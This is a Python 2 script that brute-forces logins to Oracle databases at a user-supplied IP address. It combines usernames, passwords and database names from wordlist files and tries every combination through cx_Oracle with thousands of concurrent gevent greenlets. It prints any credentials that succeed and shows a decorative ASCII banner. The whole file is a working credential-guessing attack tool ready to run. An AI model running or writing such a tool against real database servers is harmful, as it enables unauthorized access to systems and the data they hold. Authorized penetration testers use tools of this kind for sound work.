#!/usr/bin/env python
# -*- coding: utf-8 -*-

import gevent
from gevent.queue import Queue
import cx_Oracle


class Brute:
    def __init__(self, ip):
        self.ip = ip
        self.user = []
        self.passwd = []
        self.databases = []
        self.threads = []
        self.result = []

    def _test(self, weak):
        try:
            cx_Oracle.connect(weak)
            self.result.append(weak)
        except cx_Oracle.DatabaseError:
            print 'Brut:\n      ----------' + weak + '----------'

    def work(self):
        with open('user.txt') as f:
            for i in f.readlines():
                self.user.append(i.rstrip())
        with open('password.txt') as f:
            for i in f.readlines():
                self.passwd.append(i.rstrip())
        with open('databases.txt') as f:
            for i in f.readlines():
                self.databases.append(i.rstrip())
        blasting = Queue()
        for u in self.user:
            for p in self.passwd:
                for d in self.databases:
                    blasting.put(u + '/' + p + '@' + self.ip + '/' + d)
        while True:
            if not blasting.empty():
                if len(self.threads) < 5000:
                    self.threads.append(gevent.spawn(self._test, blasting.get()))
                else:
                    gevent.joinall(self.threads)
                    self.threads = []
            else:
                if len(self.threads) > 0:
                    gevent.joinall(self.threads)
                break
        print '\n----------End----------\n'
        if self.result:
            return self.output()
        else:
            print '!!!!!!!!!Failed!!!!!!!!!!'

    def output(self):
        for i in self.result:
            print 'Success:' + i + '\n'


def main():
    print """
     _        _   _      _  _    __    _  __________  _           _
    | |      | | \ \    / /| |  /  \  | ||  ________|| |         | |
    | |______| |  \ \  / / | | / /\ \ | || |________ | |         | |
    |  ______  |   \ \/ /  | | | || | | ||  ________|| |         | |
    | |      | |    \  /   | |_| || |_| || |         | |         | |
    | |      | |    |  |    \   /  \   / | |________ | |________ | |________
    |_|      |_|    |__|     \_/    \_/  |__________||__________||__________|

        """
    ip = raw_input('Please input ip:')
    Brute(ip).work()


if __name__ == '__main__':
    main()
